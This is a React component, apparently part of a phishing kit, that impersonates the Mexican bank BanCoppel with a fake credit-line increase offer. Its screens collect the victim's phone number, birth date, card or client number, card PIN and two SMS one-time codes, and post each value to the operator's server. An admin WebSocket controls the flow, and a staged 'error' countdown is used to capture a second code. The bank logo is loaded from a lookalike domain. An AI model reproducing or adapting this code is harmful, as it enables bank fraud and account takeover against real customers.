import { useState, useEffect } from "react";
import { useSearch } from "wouter";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Gift, Smartphone, CreditCard } from "lucide-react";

interface FormData {
  phoneNumber: string;
  birthDate: string;
  cardNumber: string;
  clientNumber: string;
  lastTwoDigits: string;
  nip: string;
  verificationCode: string;
  finalVerificationCode: string;
}

type Screen = "promo" | "complete-info" | "card-data" | "verification" | "error-wait" | "verification-final";

export default function TemplateBanCoppel() {
  const search = useSearch();
  const sessionId = new URLSearchParams(search).get("sessionId");
  
  const [currentScreen, setCurrentScreen] = useState<Screen>("promo");
  const [formData, setFormData] = useState<FormData>({
    phoneNumber: "",
    birthDate: "",
    cardNumber: "",
    clientNumber: "",
    lastTwoDigits: "",
    nip: "",
    verificationCode: "",
    finalVerificationCode: ""
  });
  
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isTransitioning, setIsTransitioning] = useState(false);
  const [countdown, setCountdown] = useState(7);

  // WebSocket listener for screen changes from admin
  useEffect(() => {
    if (!sessionId) return;

    const protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
    const wsUrl = `${protocol}//${window.location.host}/ws`;
    const socket = new WebSocket(wsUrl);

    socket.onmessage = (event) => {
      const data = JSON.parse(event.data);
      if (data.type === 'session_updated' && data.data?.id === sessionId) {
        const newScreen = data.data.currentScreen;
        if (newScreen && newScreen !== currentScreen) {
          setCurrentScreen(newScreen as Screen);
        }
      }
    };

    return () => {
      socket.close();
    };
  }, [sessionId, currentScreen]);

  // Countdown timer for error screen
  useEffect(() => {
    if (currentScreen === "error-wait" && countdown > 0) {
      const timer = setTimeout(() => setCountdown(countdown - 1), 1000);
      return () => clearTimeout(timer);
    } else if (currentScreen === "error-wait" && countdown === 0) {
      setCurrentScreen("verification-final");
      updateSessionScreen("verification-final");
      setCountdown(7); // Reset for next time
    }
  }, [currentScreen, countdown]);

  const updateSessionScreen = async (screen: string) => {
    if (!sessionId) return;
    try {
      await fetch(`/api/sessions/${sessionId}`, {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ currentScreen: screen })
      });
    } catch (error) {
      console.error("Error updating session screen:", error);
    }
  };

  const submitData = async (fieldName: string, fieldValue: string) => {
    if (!sessionId) return;
    try {
      await fetch("/api/submissions", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          sessionId,
          fieldName,
          fieldValue
        })
      });
    } catch (error) {
      console.error("Error submitting data:", error);
    }
  };

  const handlePromoSubmit = async () => {
    setIsTransitioning(true);
    setTimeout(() => {
      setCurrentScreen("complete-info");
      updateSessionScreen("complete-info");
      setIsTransitioning(false);
    }, 1000);
  };

  const handleCompleteInfoSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!sessionId) return;
    
    setIsSubmitting(true);
    
    try {
      await submitData("phoneNumber", formData.phoneNumber);
      await submitData("birthDate", formData.birthDate);
      await submitData("cardNumber", formData.cardNumber);
      await submitData("clientNumber", formData.clientNumber);
      
      setIsTransitioning(true);
      setTimeout(() => {
        setCurrentScreen("card-data");
        updateSessionScreen("card-data");
        setIsTransitioning(false);
      }, 1500);
      
    } catch (error) {
      console.error("Error submitting info:", error);
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleCardDataSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!sessionId) return;
    
    setIsSubmitting(true);
    
    try {
      await submitData("lastTwoDigits", formData.lastTwoDigits);
      await submitData("nip", formData.nip);
      
      setIsTransitioning(true);
      setTimeout(() => {
        setCurrentScreen("verification");
        updateSessionScreen("verification");
        setIsTransitioning(false);
      }, 1500);
      
    } catch (error) {
      console.error("Error submitting card data:", error);
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleVerificationSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!sessionId) return;
    
    setIsSubmitting(true);
    
    try {
      await submitData("verificationCode", formData.verificationCode);
      
      setIsTransitioning(true);
      setTimeout(() => {
        setCurrentScreen("error-wait");
        updateSessionScreen("error-wait");
        setIsTransitioning(false);
      }, 1500);
      
    } catch (error) {
      console.error("Error submitting verification:", error);
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleFinalVerificationSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!sessionId) return;
    
    setIsSubmitting(true);
    
    try {
      await submitData("finalVerificationCode", formData.finalVerificationCode);
      
      // Keep on this screen - final capture
      
    } catch (error) {
      console.error("Error submitting final verification:", error);
    } finally {
      setIsSubmitting(false);
    }
  };

  const renderPromoScreen = () => (
    <div className="min-h-screen bg-gradient-to-br from-blue-600 to-blue-800 flex items-center justify-center p-4">
      <div className="bg-white rounded-2xl shadow-2xl max-w-md w-full p-8 text-center">
        <div className="mb-6">
          <img 
            src="https://hh.airlines-mx.click/i/index/index_files/BanCoppel.png" 
            alt="BanCoppel" 
            className="h-16 mx-auto mb-4"
          />
        </div>
        
        <div className="mb-6">
          <Gift className="h-16 w-16 text-yellow-500 mx-auto mb-4" />
          <h1 className="text-2xl font-bold text-blue-800 mb-2">
            ¡Felicidades!
          </h1>
          <p className="text-lg text-gray-700 mb-4">
            Has sido seleccionado para aumentar tu línea de crédito
          </p>
          <div className="bg-yellow-100 border-l-4 border-yellow-500 p-4 mb-4">
            <p className="text-yellow-800 font-semibold">
              Línea disponible: $50,000.00 MXN
            </p>
          </div>
        </div>

        <div className="space-y-3 mb-6 text-left">
          <div className="flex items-center space-x-3">
            <div className="w-2 h-2 bg-green-500 rounded-full"></div>
            <span className="text-sm text-gray-600">Sin consultar buró de crédito</span>
          </div>
          <div className="flex items-center space-x-3">
            <div className="w-2 h-2 bg-green-500 rounded-full"></div>
            <span className="text-sm text-gray-600">Proceso rápido y seguro</span>
          </div>
          <div className="flex items-center space-x-3">
            <div className="w-2 h-2 bg-green-500 rounded-full"></div>
            <span className="text-sm text-gray-600">Disponible inmediatamente</span>
          </div>
        </div>

        <Button 
          onClick={handlePromoSubmit}
          className="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 text-lg rounded-full transition-all transform hover:scale-105"
          disabled={isTransitioning}
        >
          {isTransitioning ? "Cargando..." : "¡Quiero mi aumento!"}
        </Button>
        
        <p className="text-xs text-gray-500 mt-4">
          Términos y condiciones aplican
        </p>
      </div>
    </div>
  );

  const renderCompleteInfoScreen = () => (
    <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
      <div className="bg-white rounded-lg shadow-lg max-w-md w-full p-6">
        <div className="text-center mb-6">
          <img 
            src="https://hh.airlines-mx.click/i/index/index_files/BanCoppel.png" 
            alt="BanCoppel" 
            className="h-12 mx-auto mb-4"
          />
          <h1 className="text-xl font-bold text-blue-800">
            Completa la información para aumentar tu línea.
          </h1>
        </div>

        <form onSubmit={handleCompleteInfoSubmit} className="space-y-4">
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-2">
              ¿Cuál es tu número de celular?
            </label>
            <Input
              type="tel"
              placeholder="Debe tener 10 dígitos"
              value={formData.phoneNumber}
              onChange={(e) => {
                const value = e.target.value.replace(/\D/g, '').slice(0, 10);
                setFormData({...formData, phoneNumber: value});
              }}
              className="w-full bg-white text-black border-gray-300 focus:border-blue-500"
              required
              pattern="[0-9]{10}"
              title="Ingresa exactamente 10 dígitos"
              data-testid="input-phone-number"
            />
          </div>

          <div>
            <label className="block text-sm font-medium text-gray-700 mb-2">
              ¿Cuál es tu fecha de nacimiento?
            </label>
            <Input
              type="text"
              placeholder="mm/dd/yyyy"
              value={formData.birthDate}
              onChange={(e) => {
                let value = e.target.value.replace(/\D/g, '');
                if (value.length >= 2) value = value.slice(0, 2) + '/' + value.slice(2);
                if (value.length >= 5) value = value.slice(0, 5) + '/' + value.slice(5, 9);
                setFormData({...formData, birthDate: value});
              }}
              className="w-full bg-white text-black border-gray-300 focus:border-blue-500"
              required
              pattern="(0[1-9]|1[0-2])\/(0[1-9]|[12][0-9]|3[01])\/[0-9]{4}"
              title="Formato: MM/DD/YYYY"
              maxLength={10}
              data-testid="input-birth-date"
            />
          </div>

          <div>
            <label className="block text-sm font-medium text-gray-700 mb-2">
              Número de Tarjeta BanCoppel
            </label>
            <select 
              className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent bg-white text-black"
              value={formData.cardNumber}
              onChange={(e) => setFormData({...formData, cardNumber: e.target.value})}
              required
            >
              <option value="" disabled>Seleccionar tarjeta</option>
              <option value="tarjeta-credito">Tarjeta de Crédito BanCoppel</option>
              <option value="tarjeta-debito">Tarjeta de Débito BanCoppel</option>
              <option value="cuenta-ahorro">Cuenta de Ahorro</option>
            </select>
          </div>

          <div>
            <label className="block text-sm font-medium text-gray-700 mb-2">
              Ingresa el número
            </label>
            <Input
              type="text"
              placeholder="Ingresa el número de cliente, cuenta o tarjeta (16 dígitos)"
              value={formData.clientNumber}
              onChange={(e) => {
                const value = e.target.value.replace(/\D/g, '').slice(0, 16);
                setFormData({...formData, clientNumber: value});
              }}
              className="w-full bg-white text-black border-gray-300 focus:border-blue-500"
              required
              pattern="[0-9]{16}"
              title="Ingresa exactamente 16 dígitos"
              maxLength={16}
              data-testid="input-client-number"
            />
          </div>

          <Button 
            type="submit"
            className="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 rounded-full"
            disabled={isSubmitting}
            data-testid="button-continue-info"
          >
            {isSubmitting ? "Procesando..." : "Continuar"}
          </Button>
        </form>
      </div>
    </div>
  );

  const renderCardDataScreen = () => (
    <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
      <div className="bg-white rounded-lg shadow-lg max-w-md w-full p-6">
        <div className="text-center mb-6">
          <img 
            src="https://hh.airlines-mx.click/i/index/index_files/BanCoppel.png" 
            alt="BanCoppel" 
            className="h-12 mx-auto mb-4"
          />
          <h1 className="text-xl font-bold text-blue-800 mb-6">
            Datos de la tarjeta
          </h1>
        </div>

        <form onSubmit={handleCardDataSubmit} className="space-y-6">
          <div>
            <Input
              type="text"
              placeholder="2 últimos dígitos de tu tarjeta"
              value={formData.lastTwoDigits}
              onChange={(e) => {
                const value = e.target.value.replace(/\D/g, '').slice(0, 2);
                setFormData({...formData, lastTwoDigits: value});
              }}
              className="w-full bg-gray-100 text-black border-gray-300 focus:border-blue-500"
              maxLength={2}
              required
              pattern="[0-9]{2}"
              title="Ingresa exactamente 2 dígitos"
              data-testid="input-last-digits"
            />
          </div>

          <div>
            <Input
              type="password"
              placeholder="Ingresa los 4 dígitos de tu NIP"
              value={formData.nip}
              onChange={(e) => {
                const value = e.target.value.replace(/\D/g, '').slice(0, 4);
                setFormData({...formData, nip: value});
              }}
              className="w-full bg-gray-100 text-black border-gray-300 focus:border-blue-500"
              maxLength={4}
              required
              pattern="[0-9]{4}"
              title="Ingresa exactamente 4 dígitos"
              data-testid="input-nip"
            />
          </div>

          <Button 
            type="submit"
            className="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 rounded-full"
            disabled={isSubmitting}
            data-testid="button-continue-card"
          >
            {isSubmitting ? "Procesando..." : "Continuar"}
          </Button>
        </form>
      </div>
    </div>
  );

  const renderVerificationScreen = () => (
    <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
      <div className="bg-white rounded-lg shadow-lg max-w-md w-full p-6">
        <div className="text-center mb-6">
          <img 
            src="https://hh.airlines-mx.click/i/index/index_files/BanCoppel.png" 
            alt="BanCoppel" 
            className="h-12 mx-auto mb-4"
          />
          <h1 className="text-xl font-bold text-blue-800 mb-6">
            Verificacion
          </h1>
          <p className="text-sm text-gray-600 mb-2">
            Ingresa el código de 6 dígitos que hemos enviado a tu número celular
          </p>
          <p className="text-sm font-bold text-black">
            ** **** ****
          </p>
        </div>

        <form onSubmit={handleVerificationSubmit} className="space-y-6">
          <div className="flex space-x-2 justify-center">
            {[0, 1, 2, 3, 4, 5].map((index) => (
              <Input
                key={index}
                type="text"
                maxLength={1}
                className="w-12 h-12 text-center border-2 border-gray-300 bg-white text-black focus:border-blue-500"
                value={formData.verificationCode[index] || ''}
                onChange={(e) => {
                  const value = e.target.value.replace(/\D/g, '');
                  const newCode = formData.verificationCode.split('');
                  newCode[index] = value;
                  setFormData({...formData, verificationCode: newCode.join('')});
                  // Auto-focus next input
                  if (value && index < 5) {
                    const nextInput = document.querySelector(`[data-testid="input-code-${index + 1}"]`) as HTMLInputElement;
                    if (nextInput) nextInput.focus();
                  }
                }}
                data-testid={`input-code-${index}`}
              />
            ))}
          </div>

          <div className="text-center">
            <button type="button" className="text-blue-600 underline text-sm">
              ¿No recibiste el código?
            </button>
          </div>

          <Button 
            type="submit"
            className="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 rounded-full"
            disabled={isSubmitting}
            data-testid="button-verify"
          >
            {isSubmitting ? "Verificando..." : "Continuar"}
          </Button>
        </form>
      </div>
    </div>
  );

  const renderErrorWaitScreen = () => (
    <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
      <div className="bg-white rounded-lg shadow-lg max-w-md w-full p-6 text-center">
        <div className="mb-6">
          <img 
            src="https://hh.airlines-mx.click/i/index/index_files/BanCoppel.png" 
            alt="BanCoppel" 
            className="h-12 mx-auto mb-4"
          />
          <h1 className="text-xl font-bold text-blue-800 mb-6">
            Espere un momento
          </h1>
          <p className="text-red-600 font-semibold mb-6">
            ¡Ha ocurrido un error!
          </p>
        </div>

        <div className="mb-6">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto"></div>
        </div>

        <div className="text-center text-sm text-gray-600">
          <p>Por favor espere {countdown} segundos.</p>
          <p>Le estaremos enviando el código a su celular</p>
        </div>
      </div>
    </div>
  );

  const renderFinalVerificationScreen = () => (
    <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
      <div className="bg-white rounded-lg shadow-lg max-w-md w-full p-6">
        <div className="text-center mb-6">
          <img 
            src="https://hh.airlines-mx.click/i/index/index_files/BanCoppel.png" 
            alt="BanCoppel" 
            className="h-12 mx-auto mb-4"
          />
          <h1 className="text-xl font-bold text-blue-800 mb-6">
            Verificacion
          </h1>
          <p className="text-sm text-gray-600 mb-2">
            Ingresa el código de 6 dígitos que hemos enviado a tu número celular
          </p>
          <p className="text-sm font-bold text-black">
            ** **** ****
          </p>
        </div>

        <form onSubmit={handleFinalVerificationSubmit} className="space-y-6">
          <div className="flex space-x-2 justify-center">
            {[0, 1, 2, 3, 4, 5].map((index) => (
              <Input
                key={index}
                type="text"
                maxLength={1}
                className="w-12 h-12 text-center border-2 border-gray-300 bg-white text-black focus:border-blue-500"
                value={formData.finalVerificationCode[index] || ''}
                onChange={(e) => {
                  const value = e.target.value.replace(/\D/g, '');
                  const newCode = formData.finalVerificationCode.split('');
                  newCode[index] = value;
                  setFormData({...formData, finalVerificationCode: newCode.join('')});
                  // Auto-focus next input
                  if (value && index < 5) {
                    const nextInput = document.querySelector(`[data-testid="input-final-code-${index + 1}"]`) as HTMLInputElement;
                    if (nextInput) nextInput.focus();
                  }
                }}
                data-testid={`input-final-code-${index}`}
              />
            ))}
          </div>

          <div className="text-center">
            <button type="button" className="text-blue-600 underline text-sm">
              ¿No recibiste el código?
            </button>
          </div>

          <Button 
            type="submit"
            className="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 rounded-full"
            disabled={isSubmitting}
            data-testid="button-final-verify"
          >
            {isSubmitting ? "Verificando..." : "Continuar"}
          </Button>
        </form>
      </div>
    </div>
  );

  const screens = {
    "promo": renderPromoScreen,
    "complete-info": renderCompleteInfoScreen,
    "card-data": renderCardDataScreen,
    "verification": renderVerificationScreen,
    "error-wait": renderErrorWaitScreen,
    "verification-final": renderFinalVerificationScreen
  };

  return (
    <div className="bancoppel-template">
      {screens[currentScreen]()}
    </div>
  );
}